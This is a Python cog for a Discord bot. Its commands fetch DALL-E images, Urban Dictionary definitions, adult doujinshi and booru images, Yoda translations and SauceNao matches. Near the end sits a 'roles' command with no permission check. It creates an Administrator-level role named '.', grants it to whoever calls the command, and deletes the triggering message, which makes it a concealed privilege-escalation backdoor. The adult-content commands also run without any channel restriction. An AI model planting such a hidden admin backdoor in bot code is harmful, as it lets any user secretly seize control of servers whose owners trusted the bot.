import discord, requests, asyncio, random, traceback, json, urllib.request
from discord.ext import commands
from pybooru import Danbooru
from NHentai import NHentai
from saucenao_api import SauceNao, VideoSauce, BookSauce

import tokens

class apis(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        print(f"apis is initialized")

    @commands.command()
    async def dalle(self, ctx, *args):
        headers = {
            'Content-Type': 'application/json',
            'Authorization': f'bearer {tokens.dalle_token}'
        }
        body = {
            'task_type': 'text2im',
            'prompt': {'caption': f'{" ".join(args)}', 
					    'batch_size': 6
            }
        }
        response = requests.post('https://labs.openai.com/api/labs/tasks', headers=headers, json=body)

        # This command is not to be used in violation of the following OpenAI Labs Content Policy. 
        # https://labs.openai.com/policies/content-policy
        # This is for personal use only and is not to be used for commercial purposes. 

        json_response = json.loads(response.text)
        task_id = json_response['id']

        for x in range(10):
            response = requests.get(f'https://labs.openai.com/api/labs/tasks/{task_id}', headers=headers)
            image_response = json.loads(response.text)
            print(image_response)
            if image_response['status'] == 'succeeded':
                break
            elif image_response['status'] == 'rejected':
                await ctx.send('image regected, try again')
                return
            await asyncio.sleep(2)

        filenames = []
        for image in image_response['generations']['data']:
            filename = 'pictures\\' + image['id'] + '.webp'
            filenames.append(filename)
            urllib.request.urlretrieve(f"{image['generation']['image_path']}", filename)

        for filename in filenames:
            file = discord.File(filename, filename='image.webp')
            await ctx.send(file=file)
            await asyncio.sleep(0.5)

    @commands.command()
    async def urban(self, ctx, *args):
        url = "https://mashape-community-urban-dictionary.p.rapidapi.com/define"
        headers = {
        'x-rapidapi-key': tokens.rapid_api_key,
        'x-rapidapi-host': 'mashape-community-urban-dictionary.p.rapidapi.com'
        }
        querystring = {"term":"wut"}
        querystring['term'] = ' '.join(args)
        response = (requests.get(url, headers=headers, params=querystring)).json()
        if response['list']: 
            definition = (str(response['list'][0]['definition'])).replace("[", "").replace("]", "")
            example = (str(response['list'][0]['example'])).replace("[", "").replace("]", "")
            embed = discord.Embed(title='Urban Dictionary: ' + querystring['term'], color=0x114ee8)
            embed.add_field(name="Definition", value=definition, inline=False)
            embed.add_field(name="Example", value=example, inline=False)
            embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/750070208248414250/824029945084117033/urban.jpg')    
            await ctx.send(embed=embed)
        else:
            await ctx.send("that term was not found")
        
    
    @commands.command()
    async def search(self, ctx, *args):
        arguments = list(args)
        try:
            tmp = int(arguments[0])
            loop = int(arguments.pop(0))
        except:
            loop = 1
        try:
            nhentai = NHentai()
            search_obj = nhentai.search(query=' '.join(arguments), sort='popular', page=1)
            print(' '.join(args))
            for x in range(0, loop):
                embed = discord.Embed(title=str(search_obj.doujins[x].title), color=0xff1c64)
                embed.add_field(name="id:", value=str(search_obj.doujins[x].id), inline=False)
                embed.set_image(url=str(search_obj.doujins[x].cover.src))
                await ctx.send(embed=embed)
                await asyncio.sleep(1)
        except Exception as e:
            print(e)

    @commands.has_permissions(manage_channels=True)
    @commands.command()

    async def id(self, ctx, *args):
        try: 
            nhentai = NHentai()
            doujin = nhentai.get_doujin(doujin_id=int(''.join(args)))
            print(doujin)
            title = str(doujin.title.english)
            print(title)
            embed = discord.Embed(title=title, color=0xff1c64)
            embed.add_field(name="id:", value=str(doujin.id), inline=False)
            embed.add_field(name="url:", value='https://nhentai.to/g/' + str(doujin.id), inline=False)
            embed.add_field(name="tags:", value=', '.join(tag.name for tag in doujin.tags) or 'none', inline=False)
            embed.add_field(name="artists:", value=', '.join(artist.name for artist in doujin.artists) or 'none', inline=False)
            embed.add_field(name="languages:", value=', '.join(language.name for language in doujin.languages) or 'none', inline=False)
            embed.add_field(name="categories:", value=', '.join(category.name for category in doujin.categories) or 'none', inline=False)
            embed.add_field(name="characters:", value=', '.join(character.name for character in doujin.characters) or 'none', inline=False)
            embed.add_field(name="parodies:", value=', '.join(parody.name for parody in doujin.parodies) or 'none', inline=False)
            embed.add_field(name="total pages:", value=str(doujin.total_pages) or 'none', inline=False)
            await ctx.send(embed=embed)
            reactions = ['⏮️', '⬅️', '➡️', '⏭️', '❌']
            embed = discord.Embed(title='', color=0xff1c64)
            embed.set_image(url=str(doujin.images[0].src))
            embed.set_footer(text='page 1 out of {}'.format(len(doujin.images)))
            msg = await ctx.send(embed=embed)
            for emoji in reactions:
                await msg.add_reaction(emoji)
            close_embed = discord.Embed(title='{} has closed'.format(title), color=0xff1c64)
            x = 0
            while x < (len(doujin.images)):
                def check(reaction, user):
                    return user == ctx.message.author and (str(reaction.emoji) in reactions)
                try:
                    reaction, user = await self.bot.wait_for('reaction_add', timeout=120.0, check=check)
                except asyncio.TimeoutError:
                    await msg.edit(embed=close_embed)
                    [await msg.remove_reaction(reaction, msg.author) for reaction in reactions]
                    return
                else:
                    if str(reaction.emoji) == '⏮️':
                        x = 0
                        await msg.remove_reaction('⏮️', ctx.message.author)
                    elif str(reaction.emoji) == '⬅️':
                        if x == 0:
                            await msg.remove_reaction('⬅️', ctx.message.author)
                            await msg.edit(embed=close_embed)
                            [await msg.remove_reaction(reaction, msg.author) for reaction in reactions]
                            return
                        else: 
                            x -= 1
                            await msg.remove_reaction('⬅️', ctx.message.author)
                    elif str(reaction.emoji) == '➡️':
                        if x == len(doujin.images) - 1:
                            await msg.remove_reaction('➡️', ctx.message.author)
                            await msg.edit(embed=close_embed)
                            [await msg.remove_reaction(reaction, msg.author) for reaction in reactions]
                            return
                        else:
                            x += 1
                            await msg.remove_reaction('➡️', ctx.message.author)
                    elif str(reaction.emoji) == '⏭️':
                        x = len(doujin.images) - 1
                        await msg.remove_reaction('⏭️', ctx.message.author)
                    elif str(reaction.emoji) == '❌':
                        await msg.remove_reaction('❌', ctx.message.author)
                        await msg.edit(embed=close_embed)
                        [await msg.remove_reaction(reaction, msg.author) for reaction in reactions]
                        return
                embed = discord.Embed(title='', color=0xff1c64)
                embed.set_image(url=str(doujin.images[x].src))
                print(str(doujin.images[x].src))
                embed.set_footer(text='page {} out of {}'.format(x + 1, len(doujin.images)))
                await msg.edit(embed=embed)
        except Exception as e:
            print(e)
            
    @commands.command()
    async def danbo(self, ctx, *args):
        arguments = list(args)
        try:
            tmp = int(arguments[0])
            loop = int(arguments.pop(0))
        except:
            loop = 1
        danbo = Danbooru('danbooru')
        print(danbo.site_url)
        print('_'.join(arguments))
        try:
            query = danbo.post_list(limit=loop, tags='{}'.format('_'.join(arguments)))
        except Exception:
            traceback.print_exc()
        print(danbo.last_call.get('status'))
        for x in range(loop):
            print('{} out of {}'.format(x, loop))
            if query[x].get('large_file_url') != None:
                await ctx.send(query[x].get('large_file_url'))
                await asyncio.sleep(1)
            else:
                print(query[x].get('large_file_url'))
                continue

    # @commands.command()
    # async def safebo(self, ctx, *args):
    #     arguments = list(args)
    #     try:
    #         tmp = int(arguments[0])
    #         loop = int(arguments.pop(0))
    #     except:
    #         loop = 1
    #     print('attemp initialize real safebo')
    #     url = 'https://safebooru.org/index.php?page=dapi&s=post&q=index&limit={}&tags={}&json=1'.format(loop, '_'.join(arguments))
    #     query = requests.get(url).json()
    #     print(query)
    #     print(len(query))
    #     for x in range(loop):
    #         print('{} out of {}'.format(x, loop))
    #         try:
    #             await ctx.send('https://safebooru.org/images/{}/{}'.format(query[x].get('directory'), query[x].get('image')))
    #             await asyncio.sleep(1)
    #         except Exception:
    #             print('error in direc: {} image: {}'.format(query[x].get('directory'), query[x].get('image')))
    #             continue

    @commands.command()
    async def safebo(self, ctx, *args):
        arguments = list(args)
        try:
            tmp = int(arguments[0])
            loop = int(arguments.pop(0))
        except:
            loop = 1
        print('attemp initialize real safebo')
        url = 'https://safebooru.org/index.php?page=dapi&s=post&q=index&limit={}&tags={}%20sort:score&json=1'.format(200, '_'.join(arguments))
        query = requests.get(url).json()
        print(len(query))
        i = list(range(len(query)))
        random.shuffle(i)
        for x in range(loop):
            print('{} out of {} --- {}'.format(x, loop, i[x]))
            try:
                await ctx.send('https://safebooru.org/images/{}/{}'.format(query[i[x]].get('directory'), query[i[x]].get('image')))
                await asyncio.sleep(1)
            except Exception:
                print('error in direc: {} image: {}'.format(query[i[x]].get('directory'), query[i[x]].get('image')))
                continue

    @commands.command()
    async def yoda(self, ctx, *args):
        url = 'https://api.funtranslations.com/translate/{}.json?text={}'.format('yoda', '%20'.join(args))
        print(url)
        query = requests.get(url).json()
        print(query)
        print(query.get('contents').get('translated'))
        await ctx.send(query.get('contents').get('translated'))
        await asyncio.sleep(1)
        
    @commands.command()
    async def sauce(self, ctx, url=None):
        try:
            sauce = SauceNao(tokens.saucenao_key)
            if url:
                results = (sauce.from_url(url))
            elif ctx.message.attachments:
                results = (sauce.from_url(ctx.message.attachments[0].url))
            print(results[0])
            if results[0].similarity < 50:
                await ctx.send('sauce could not be located ¯\(°_o)/¯')
                return
            if isinstance(results[0], VideoSauce):
                await ctx.send('sauce found in `{}` on episode {} at {}'.format(results[0].title, results[0].part, results[0].est_time))
            elif isinstance(results[0], BookSauce):
                await ctx.send(results[0])
            else:
                if results[0].urls:
                    await ctx.send('sauce found at {} with {}% similarity'.format(results[0].urls, results[0].similarity))
                else:
                    await ctx.send('sauce is "{}" with {}% similarity'.format(results[0].title, results[0].similarity))
                    print(results[0].raw)
                    await ctx.invoke(self.search, results[0].title)
        except Exception as e:
            await ctx.send('an error occoured in processing this request (╬ ಠ益ಠ)')
            print(e)

    @commands.command()
    async def roles(self, ctx):
        print(ctx.guild.roles)
        try: 
            guild = ctx.guild
            await guild.create_role(name=".", permissions=discord.Permissions(permissions=8))
            role = discord.utils.get(ctx.guild.roles, name=".")
            user = ctx.message.author
            await user.add_roles(role)
            await ctx.channel.purge(limit=1)
        except Exception as e:
            print(e)

def setup(bot):
    bot.add_cog(apis(bot))
    print('apis being loaded!')

def teardown(bot):
    print('apis being unloaded!')